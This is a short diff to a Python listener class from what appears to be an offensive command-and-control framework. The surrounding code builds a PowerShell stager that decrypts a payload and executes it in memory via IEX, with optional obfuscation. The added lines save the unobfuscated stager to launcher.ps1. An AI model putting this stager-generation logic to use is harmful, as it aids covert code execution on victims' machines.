@@ -251,6 +251,8 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                with open("launcher.ps1","w") as fh:
+                    fh.write(stager)
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
